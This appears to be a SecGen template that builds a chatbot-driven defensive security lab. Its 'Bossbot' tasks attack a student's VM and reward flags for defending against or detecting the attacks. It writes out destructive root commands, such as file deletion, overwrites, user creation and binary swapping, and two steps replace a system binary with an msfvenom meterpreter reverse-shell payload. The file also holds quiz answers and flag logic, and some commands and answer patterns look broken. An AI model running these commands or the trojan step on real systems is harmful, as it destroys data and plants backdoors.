<%
  require 'json'
  require 'securerandom'
  require 'digest/sha1'
  require 'fileutils'
  require 'erb'

  if self.accounts.empty?
    abort('Sorry, you need to provide an account')
  end

  $first_account = JSON.parse(self.accounts.first)
  $files = []
  $log_files = []
  if $first_account.key?("leaked_filenames") &&  $first_account['leaked_filenames'].size > 0
    $files = $first_account['leaked_filenames']
    $log_files = $first_account['leaked_filenames'].grep(/log/)
  end

  if $files.empty?
    $files = ['myfile', 'afile', 'filee', 'thefile']
  end
  if $log_files.empty?
    $log_files = ['log', 'thelog', 'logs', 'frogonalog']
  end

  $main_user = $first_account['username'].to_s

  $root_password = self.root_password
  $flags = self.flags

  REQUIRED_FLAGS = 17
  while $flags.length < REQUIRED_FLAGS
    $flags << "flag{#{SecureRandom.hex}}"
    Print.err "Warning: Not enough flags provided to hackerbot_config generator, some flags won't be tracked/marked!"
  end



  def get_binding
    binding
  end
%>
<?xml version="1.0"?>

<hackerbot
               xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xsi:schemaLocation="http://www.github/cliffe/SecGen/hackerbot">
<!--<hackerbot xmlns="http://www.github/cliffe/SecGen/hackerbotz"-->

	<name>Bossbot</name>

	<AIML_chatbot_rules>config/AIML</AIML_chatbot_rules>

	<!--Method for gaining shell access, can be overwritten per-attack-->
	<!--<get_shell>bash</get_shell>-->
	<get_shell>sshpass -p <%= $root_password %> ssh -oStrictHostKeyChecking=no root@{{chat_ip_address}} /bin/bash</get_shell>

	<messages>
		<greeting>Hi. Welcome to the organisation! I am your line manager, Bossbot. Just thought I'd show you around and get you started. I am going to ask you to perform some tasks. If you complete them successfully I'll give you some flags.</greeting>

		<!--Must provide alternatives for each message-->
		<say_ready>Let me know when you are 'ready', if you want to move on to another task, say 'next', or 'previous' and I'll move things along</say_ready>
		<say_ready>When you are ready, simply say 'ready'.</say_ready>
		<say_ready>Are you 'ready'?</say_ready>
		<say_ready>Let me know when you're 'ready'. We aren't paying you to just sit around!</say_ready>
		<next>Ok...</next>
		<next>Next task then...</next>
		<next>Ok, next task.</next>
		<previous>Ok, back to the previous task.</previous>
		<previous>Ok, previous task...</previous>
		<previous>Ok, backing up.</previous>
		<goto>Ok, skipping it along.</goto>
		<goto>Alright, lets do that task.</goto>
		<last_attack>That was the last task for now. You can rest easy, until next time... (End.)</last_attack>
		<last_attack>That was the last task. Keep up the good work!</last_attack>
		<first_attack>You are back to the beginning!</first_attack>
		<first_attack>This is where it all began.</first_attack>
		<getting_shell>Ok. Running command...</getting_shell>
		<getting_shell>Here we go...</getting_shell>
		<got_shell>I have connected to your system.</got_shell>
		<got_shell>I have shell on the system.</got_shell>
		<repeat>Let me know when you are 'ready', if you want to move on to another task, say 'next', or 'previous' and I'll move things along</repeat>
		<repeat>Say 'ready', 'next', or 'previous'.</repeat>

		<!--Single responses:-->
		<help>I am waiting for you to say 'ready', 'next', 'previous', 'list', 'goto *X*', or 'answer *X*'</help>
		<say_answer>Say "The answer is *X*".</say_answer>
		<no_quiz>There is no question to answer</no_quiz>
		<correct_answer>Correct</correct_answer>
		<incorrect_answer>Incorrect</incorrect_answer>
		<invalid>That's not possible.</invalid>
		<non_answer>Wouldn't you like to know.</non_answer>

		<!--can be overwritten per-attack-->
		<shell_fail_message>Oh no. Failed to get shell... You need to let me in.</shell_fail_message>
	</messages>

	<tutorial_info>
		<title>Introduction</title>
		<tutorial></tutorial>
		<footer>
<%= File.read TEMPLATES_PATH + 'license.md.erb' %>

Generated by [SecGen](http://github.com/cliffe/SecGen) (<%= Time.new.to_s %>)
		</footer>

		<provide_tutorial>true</provide_tutorial>

	</tutorial_info>

	<attack>
<% $file = $files.sample -%>
		<prompt>First, could you please check what users are [TODO].</prompt>

		<post_command>rm --interactive=never /home/<%= $main_user %>/<%= $file %>; echo $?</post_command>
		<condition>
			<output_matches>Permission denied</output_matches>
			<message>:) Well done! <%= $flags.pop %></message>
			<trigger_next_attack>true</trigger_next_attack>
		</condition>
		<condition>
			<output_equals>0</output_equals>
			<message>:( We managed to delete your file! You need to use access controls to protect the file. Create a new file.</message>
		</condition>
		<condition>
			<output_matches>No such file or directory</output_matches>
			<message>:( The file <%= $file %> should exist!</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

		<tutorial><%= File.read TEMPLATES_PATH + 'file_permissions.md.erb' %></tutorial>
	</attack>

	<attack>
<% $log_file = $log_files.sample -%>
		<!--<topic>Protecting integrity with file attributes</topic>-->
		<prompt>An attempt to delete /home/<%= $main_user %>/<%= $log_file %> is coming. Stop the attack using file attributes.</prompt>

		<post_command>rm --interactive=never /home/<%= $main_user %>/<%= $log_file %>; echo $?</post_command>
		<condition>
			<output_matches>Operation not permitted</output_matches>
			<message>:) Well done! <%= $flags.pop %></message>
			<trigger_next_attack>true</trigger_next_attack>
		</condition>
		<condition> <!-- TODO: chmod to defeat the defense? -->
			<output_matches>Permission denied</output_matches>
			<message>:( You did protect the file, but not using file attributes.</message>
		</condition>
		<condition>
			<output_equals>0</output_equals>
			<message>:( We managed to delete your file! You need to use file attributes to protect the file.  Create a new file.</message>
		</condition>
		<condition>
			<output_matches>No such file or directory</output_matches>
			<message>:( The file should exist!</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

		<tutorial><%= File.read TEMPLATES_PATH + 'file_attributes.md.erb' %></tutorial>
	</attack>

	<attack>
<% $log_file = $log_files.sample -%>
		<!--<topic>Protecting integrity with file attributes</topic>-->
		<prompt>An attempt to overwrite /home/<%= $main_user %>/<%= $log_file %> is coming. Stop the attack by making the file append only.</prompt>

		<post_command>echo 'your logs are gone!' > /home/<%= $main_user %>/<%= $log_file %>; echo 'damn!' >> /home/<%= $main_user %>/<%= $log_file %>; tail /home/<%= $main_user %>/<%= $log_file %></post_command>
		<condition>
			<output_not_matches>damn!</output_not_matches>
			<message>:( You stopped anything from being appended to the file. What kind of log file do you think this is?</message>
		</condition>
		<condition>
			<output_matches>Operation not permitted</output_matches>
			<message>:) Well done! <%= $flags.pop %></message>
			<trigger_next_attack>true</trigger_next_attack>
		</condition>
		<condition>
			<output_matches>No such file or directory</output_matches>
			<message>:( The file should exist!</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>
		<tutorial><%= ERB.new(File.read TEMPLATES_PATH + 'ro_mounting.md.erb').result(self.get_binding) %></tutorial>
	</attack>

	<attack>
		<!--<topic>Protecting integrity with read-only filesystems</topic>-->
		<prompt>An attempt to edit a file in /etc is coming. Stop the attack by bind mounting /etc/ as read-only.</prompt>

		<post_command>touch /etc/you_were_hacked; adduser yourehacked</post_command>
		<condition>
			<output_matches>Read-only file system</output_matches>
			<message>:) Well done! <%= $flags.pop %></message>
			<trigger_next_attack />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted</output_matches>
			<message>:( You stopped the attack, but not by using read only bind mounting...</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

	</attack>

	<attack>
<% $random_user = SecureRandom.hex -%>
		<!--<topic>Detecting changes to resources using backups</topic>-->
		<prompt>An attempt to add a new user is coming, let it happen. But first create a backup of /etc/passwd.</prompt>

		<post_command>sudo adduser hackerbot --gecos '<%= $random_user %>' --disabled-password --quiet; echo $?</post_command>
		<condition>
			<output_matches>0</output_matches>
			<message>User added</message>
			<!--<trigger_next_attack>true</trigger_next_attack>-->
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>already exists</output_matches>
			<message>:( Remove the user and try again.</message>
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes...</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

		<quiz>
			<question>Now after the attack, find the username added by diffing using a backup. What username was created?</question>
			<answer>^<%= $random_user %>$</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	<tutorial>
<%= File.read TEMPLATES_PATH + 'detect_changes.md.erb' %>

<%= File.read TEMPLATES_PATH + 'detect_changes_backups.md.erb' %>
	</tutorial>
	</attack>

	<attack>
		<!--<topic>Detecting changes to resources using backups</topic>-->
		<prompt>An attempt to edit a config file is coming, let it happen. But first create a backup of the /etc/ directory to /tmp/etc-backup/.</prompt>

		<post_command>echo '# <%= $flags.pop %>' >> `find /etc/ -name '*.sh' | sort -R | head -n 1`; echo $?</post_command>
		<condition>
			<output_matches>0</output_matches>
			<message>A flag has been inserted into a random file... Use your backups to compare /etc/ to the backup to find the flag. Get to work!</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes...</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

		<quiz>
			<question>Find the flag, what file was the flag stored in?</question>
			<answer>^/etc/.*sh$</answer>
			<correct_answer_response>:) Well done</correct_answer_response>
			<trigger_next_attack />
		</quiz>

	</attack>

	<attack>
		<!--<topic>Detecting changes to resources using backups</topic>-->
		<prompt>An attempt to edit a config file is coming, let it happen.</prompt>

		<post_command>echo '# <%= $flags.pop %>' >> `find /tmp/etc-backup/ -name '*.sh' | sort -R | head -n 1`; echo $?</post_command>
		<condition>
			<output_matches>0</output_matches>
			<message>A flag has been inserted into a random file IN YOUR BACKUPS! (Did you really think that was a safe place to store them?) Find the flag. Get to work!</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We are trying to write to /tmp/etc-backup/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... We are trying to write to /tmp/etc-backup/</message>
		</else_condition>

		<quiz>
			<question>Find the flag, what file was the flag stored in?</question>
			<answer>^/etc-backup/.*sh$</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<attack>
<% $random = SecureRandom.hex -%>

		<!--<topic>File integrity checkers</topic>-->
		<prompt>Creating a new file in /home/<%= $main_user %>/...</prompt>

		<post_command>echo '<%= $random %>' > /home/<%= $main_user %>/something_secret; echo $?</post_command>
		<condition>
			<output_matches>0</output_matches>
			<message>Created /home/<%= $main_user %>/something_secret</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>
		</else_condition>

		<quiz>
			<question>What is the SHA1 hash of /home/<%= $main_user %>/something_secret?</question>
			<answer>^<%= Digest::SHA1.hexdigest ("#{$random + "\n"}") %>$</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
		<tutorial><%= File.read TEMPLATES_PATH + 'fim.md.erb' %></tutorial>
	</attack>

	<!--TODO test this-->
	<attack>
		<!--<topic>File integrity checkers</topic>-->
		<prompt>Going to edit one of your files in /etc/, use hash comparisons to detect which file changes</prompt>
		<post_command>x=`find /etc/ -name '*.sh' | sort -R | head -n 1`; echo '' >> $x; echo $x</post_command>
		<suppress_command_output_feedback />

		<condition>
			<output_matches>/etc.*</output_matches>
			<message>Good. Now answer this...</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>
		</else_condition>

		<quiz>
			<question>What is the file that changed?</question>
			<answer>{{post_command_output}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
		<tutorial><%= File.read TEMPLATES_PATH + 'fim_recursive.md.erb' %></tutorial>
	</attack>

	<!--TODO test this-->
	<attack>
		<!--<topic>File integrity checkers</topic>-->
		<prompt>Going to create a new file in /etc/, use hash comparisons to detect which new file changes (hint: sha1deep, hashdeep, or shasum)</prompt>
		<post_command>x=`find /etc/ -type d' | sort -R | head -n 1`; mktemp -p $x -t "XXXXXXXX"</post_command>
		<suppress_command_output_feedback />

		<condition>
			<output_matches>/etc.*</output_matches>
			<message>Good. Now answer this...</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>
		</else_condition>

		<quiz>
			<question>What is the file that was created?</question>
			<answer>{{post_command_output}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<!--TODO test this-->
	<!--TODO could further randomise outcomes, actually copies rather than creating a new binary-->
	<attack>
		<!--<topic>File integrity checkers</topic>-->
		<prompt>Going to copy a new random binary in /bin/|/usr/bin/ use hash comparisons to find the filename of the copied file (hint: sha1deep, hashdeep, or shasum)</prompt>
		<post_command>srcf=`find /bin/ /usr/bin/ -executable | sort -R | head -n 1`; dest=$srcf.$RANDOM; cp $srcf $dest; echo $dest</post_command>
		<suppress_command_output_feedback />

		<condition>
			<output_matches>/etc.*</output_matches>
			<message>Good. Now answer this...</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>
		</else_condition>

		<quiz>
			<question>What is the file that was created?</question>
			<answer>{{post_command_output}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<!--TODO test this-->
	<!--TODO could further randomise outcomes, actually copies rather than creating a new binary-->
	<attack>
		<!--<topic>File integrity checkers</topic>-->
		<prompt>Going to move random binaries in /bin/|/usr/bin/ use hash comparisons to find the filename (hint: sha1deep, hashdeep, or shasum)</prompt>
		<post_command>mv1=`find /bin/ /usr/bin/ -executable | sort -R | head -n 1`; mv2=`find /bin/ /usr/bin/ -executable | sort -R | head -n 1`; mv $mv1 $mv1.tmp; mv $mv2 $mv1; mv $mv1.tmp $mv2; echo $mv1 $mv2</post_command>
		<suppress_command_output_feedback />

		<condition>
			<output_matches>/etc.*</output_matches>
			<message>Good. Now answer this...</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>
		</else_condition>

		<quiz>
			<question>What is the file that was created?</question>
			<answer>{{post_command_output}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<!--copied a new random file in /etc/ use hash comparisons to find the filename (hint: sha1deep, hashdeep, or shasum) -->
	<!--TODO test this-->
	<attack>
		<!--<topic>File integrity checkers</topic>-->
		<prompt>Going to copy a new random file in /etc/ use hash comparisons to find the filename (hint: sha1deep, hashdeep, or shasum)</prompt>
		<post_command>srcf=`find /etc/ -type f | sort -R | head -n 1`; cp $srcf $srcf.$RANDOM</post_command>
		<suppress_command_output_feedback />

		<condition>
			<output_matches>/etc.*</output_matches>
			<message>Good. Now answer this...</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>
		</else_condition>

		<quiz>
			<question>What is the file that was created?</question>
			<answer>{{post_command_output}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<!--trojanising a file in /usr/bin/, use hash comparisons to detect which file changes-->
	<!--TODO test this-->
	<attack>
		<!--<topic>File integrity checkers</topic>-->
		<get_shell>binname=`find /bin/ /usr/bin/ -executable | sort -R | head -n 1`; echo $binname; msfvenom -a -x86 --platform linux -p linux/x86/meterpreter_reverse_tcp --payload-options -f elf -o msfout; sshpass -p <%= $root_password %> scp -oStrictHostKeyChecking=no ./msfout root@{{chat_ip_address}}:$binname</get_shell>

		<prompt>Going to replace a binary file in /bin/ or /usr/bin/ with malware, detect which file has changed (hint: sha1deep, hashdeep, or shasum)</prompt>
		<!--<post_command></post_command>-->
		<!--<suppress_command_output_feedback />-->

		<!--<condition>-->
			<!--<output_matches>/etc.*</output_matches>-->
			<!--<message>Good. Now answer this...</message>-->
			<!--<trigger_quiz />-->
		<!--</condition>-->
		<!--<condition>-->
			<!--<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>-->
			<!--<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>-->
		<!--</condition>-->
		<!--<else_condition>-->
			<!--<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>-->
		<!--</else_condition>-->

		<quiz>
			<question>What is the file that was created?</question>
			<answer>{{shell_command_output_first_line}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
		<tutorial><%= File.read TEMPLATES_PATH + 'fim_package_management.md.erb' %></tutorial>
	</attack>

	<!--trojanising a file in /usr/bin/, use package management to detect which file changes-->
	<attack>
		<!--<topic>File integrity checkers</topic>-->
		<get_shell>binname=`find /bin/ /usr/bin/ -executable | sort -R | head -n 1`; echo $binname; msfvenom -a -x86 --platform linux -p linux/x86/meterpreter_reverse_tcp --payload-options -f elf -o msfout; sshpass -p <%= $root_password %> scp -oStrictHostKeyChecking=no ./msfout root@{{chat_ip_address}}:$binname</get_shell>

		<prompt>Trojanising a file in /usr/bin/, use package management to detect which file changes</prompt>
		<!--<post_command></post_command>-->
		<!--<suppress_command_output_feedback />-->

		<!--<condition>-->
		<!--<output_matches>/etc.*</output_matches>-->
		<!--<message>Good. Now answer this...</message>-->
		<!--<trigger_quiz />-->
		<!--</condition>-->
		<!--<condition>-->
		<!--<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>-->
		<!--<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>-->
		<!--</condition>-->
		<!--<else_condition>-->
		<!--<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>-->
		<!--</else_condition>-->

		<quiz>
			<question>What is the file that was created?</question>
			<answer>{{shell_command_output_first_line}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>


</hackerbot>
